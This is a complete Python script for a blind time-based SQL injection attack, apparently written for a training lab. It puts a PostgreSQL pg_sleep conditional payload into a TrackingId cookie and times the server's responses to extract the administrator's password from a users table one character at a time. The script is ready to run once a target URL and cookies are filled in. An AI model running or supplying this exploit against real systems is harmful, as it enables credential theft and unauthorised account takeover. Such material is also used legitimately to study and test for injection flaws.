import requests
import time
import string

# Target configuration
url = "" #put your url here
cookie_name = "TrackingId"
base_cookie = "" #put your cookie here
session_cookie = "" #put your session cookie here

# Injection configuration
sleep_threshold = 10  # seconds
max_password_length = 20  # adjust if needed
charset = string.ascii_lowercase + string.digits  # adjust if needed

def test_char(position, char):
    # Construct the malicious cookie
    malicious_cookie = f"{base_cookie}'||(SELECT CASE WHEN (select substring(password,{position},1) from users where username='administrator')='{char}' THEN pg_sleep({sleep_threshold}) ELSE pg_sleep(0) END)--"
    
    cookies = {
        "TrackingId": malicious_cookie,
        "session": session_cookie
    }
    
    # Measure response time
    start_time = time.time()
    try:
        response = requests.get(url, cookies=cookies)
        elapsed_time = time.time() - start_time
        return elapsed_time
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        return 0

def find_password():
    password = []
    print("Starting blind SQL time-based injection attack...")
    print("Only printing characters that cause a delay ≥10 seconds")
    
    for position in range(1, max_password_length + 1):
        found_char = None
        
        for char in charset:
            elapsed_time = test_char(position, char)
            
            if elapsed_time >= sleep_threshold:
                found_char = char
                password.append(char)
                print(f"Found char at position {position}: {char}")
                break
        
        if not found_char:
            print(f"No valid character at position {position}. Password complete.")
            break
    
    print(f"\nFinal password: {''.join(password)}")

if __name__ == "__main__":
    find_password()